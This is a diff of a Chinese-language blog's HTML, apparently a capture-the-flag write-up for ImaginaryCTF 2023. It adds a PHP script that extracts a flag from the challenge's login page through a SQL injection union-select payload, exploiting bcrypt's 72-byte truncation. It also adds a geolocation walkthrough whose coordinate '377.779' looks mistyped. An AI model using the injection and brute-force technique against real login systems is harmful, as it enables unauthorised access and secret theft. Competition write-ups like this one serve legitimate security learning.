@@ -40,9 +40,14 @@
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724015219040.png">
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724015352137.png">
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724020238024.png">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724161504043.png">
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724022049089.png">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/signpost.png">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/seals.jpg">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724165912622.png">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724165959400.png">
 <meta property="article:published_time" content="2023-07-23T09:23:12.000Z">
-<meta property="article:modified_time" content="2023-07-23T18:22:37.293Z">
+<meta property="article:modified_time" content="2023-07-24T09:02:32.915Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Misc">
@@ -259,7 +264,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k words
+          14k words
         
       </span>
     
@@ -270,7 +275,7 @@
         
         
         
-          101 mins
+          115 mins
         
       </span>
     
@@ -391,6 +396,8 @@
 <p>登陆成功后访问&#x2F;flag，拿到flag：</p>
 <p><img src="/2023/07/23/imaginary-ctf/image-20230724011741863.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
+<h3 id="Perfect-Picture"><a href="#Perfect-Picture" class="headerlink" title="Perfect Picture"></a>Perfect Picture</h3><p>看一眼源代码就是修改图片像素参数</p>
+<hr>
 <h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>当你感觉什么都没有的时候，为什么不按下F12呢？  ————鲁迅</p>
 <p>直接传&#x2F;?source</p>
 <p><img src="/2023/07/23/imaginary-ctf/image-20230724012342239.png" srcset="/img/loading.gif" lazyload></p>
@@ -413,10 +420,17 @@
 <p>是的，没错。。是<code>.=</code>我从第一眼就没见到那个点点，这为我之后的懵逼历程埋下了大大的伏笔。。。</p>
 <p>什么意思呢，如果有GET传入$magic，也就是<code>688a35c685a7a654abc80f8e123ad9f0</code>，那么password变量就会与flag拼接起来，这也将是我们之后的突破口。</p>
 <p>然后开始懵逼，最开始没看到那个点点，一度想尝试过爆破逐一比对hash，结果捏，三四十个预选字符，长度大概二十多三十多吧，也就40多的30多次方种情况吧，不多不多（</p>
-<p>然后就求助与学长了，其实当时如果自己去php官网有目的性地查找，是能够查询到password_hash的相关特性的</p>
+<p>然后就求助与学长了，其实当时如果自己去<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.password-hash.php">php官网</a>有目的性地查找，是能够查询到password_hash的相关特性的</p>
 <p>使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节，这是官方给出的描述</p>
 <p><img src="/2023/07/23/imaginary-ctf/image-20230724020238024.png" srcset="/img/loading.gif" lazyload></p>
-<p>当时我没去自己查相关特性，求助了L1ao学长，他给了个<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify"><strong>trick</strong></a>，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把<code>.=</code>看成 <code>=</code>了呜呜呜呜呜，</p>
+<p>当时我没去自己查相关特性，求助了L1ao学长，他给了个<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify"><strong>trick</strong></a>，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把<code>.=</code>看成 <code>=</code>了呜呜呜呜呜，下面是trick的内容</p>
+<p><img src="/2023/07/23/imaginary-ctf/image-20230724161504043.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>False<br><br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>True<br></code></pre></td></tr></table></figure>
+
+<p>PASSWORD_BCRYPT加密的时候只对前72个字节加密，超过72字节的部分不管，根据这个我们可以得出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//False<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;i&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">70</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ic&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">69</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ict&#x27;</span><br>//True<br>........                               <br></code></pre></td></tr></table></figure>
+
+<p>由于是传入<code>$magic</code>之后<code>$password</code>是拼接在用户传入的部分后面的，(这里我们暂称重复的71个’a’为冗余字节)所以可以从71一个一个减少用户传入的冗余字节数，每次减少一个字节数之后，遍历候选字符集，拼接在冗余字节<strong>和已知password部分</strong>后面(不要每次都只拼接在冗余字节后面，要爆出来一个就紧跟在a后面)</p>
 <p>最开始的时候不知道为啥闲着没事就用php而不是python写了一个脚本：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span>;<br><span class="hljs-variable">$pre</span> = <span class="hljs-string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?&#123;&#125;_&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$pre</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$re</span> = <span class="hljs-number">71</span>;<span class="hljs-variable">$re</span> &gt; <span class="hljs-number">0</span>;<span class="hljs-variable">$re</span>--)&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>)&#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>);<br>        <span class="hljs-variable">$password</span> =  <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>).<span class="hljs-variable">$flag</span>.<span class="hljs-variable">$i</span>, PASSWORD_BCRYPT);<br>        <span class="hljs-variable">$post</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        );<br>        <span class="hljs-comment">#echo $post[&#x27;username&#x27;];</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$post</span>);<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POST, <span class="hljs-number">1</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$post</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>); <br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-string">&#x27;Welcome&#x27;</span>))&#123;<br>            <span class="hljs-variable">$flag</span> .= <span class="hljs-variable">$i</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">#echo $res;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -425,7 +439,27 @@
 
 <p>超酷的好吗</p>
 <p><img src="/2023/07/23/imaginary-ctf/image-20230724022049089.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2>
+<hr>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signpost"><a href="#Signpost" class="headerlink" title="Signpost"></a>Signpost</h3><p>一道社工题，给了个路标，找经纬度，大致能看清图片上信息：</p>
+<ol>
+<li>距SCOTTSDALE STADIUM 761英里</li>
+<li>距离POLO(?)GROUNDS 2925英里</li>
+<li>距SEALS STADIUM2英里</li>
+</ol>
+<p><img src="/2023/07/23/imaginary-ctf/signpost.png" srcset="/img/loading.gif" lazyload></p>
+<p>本来，按理来说是要分别找到这三个已知点的经纬度，根据距离画三个圆，三个圆的交点便是目标点附近，但是。。</p>
+<p>根据题目描述，这个地方是在一个ball park主题公园，当时我在快乐搜索这三个已知点的时候</p>
+<p><img src="/2023/07/23/imaginary-ctf/seals.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>直觉告诉我这就是题目要的ballpark，Google Earth，启动！！</p>
+<p>emmmm，我不管！！肯定就是Oracle Park！！</p>
+<p><img src="/2023/07/23/imaginary-ctf/image-20230724165912622.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取经纬度</p>
+<p><img src="/2023/07/23/imaginary-ctf/image-20230724165959400.png" srcset="/img/loading.gif" lazyload></p>
+<p>联想到社工误差较大，给了一定的容错空间</p>
+<p>但是就在附近的话经纬度变化不会太大</p>
+<p>377.779±0.03,-122.389±0.03</p>
+<p>试了十几次试出来了</p>
+
                 
               </div>
             
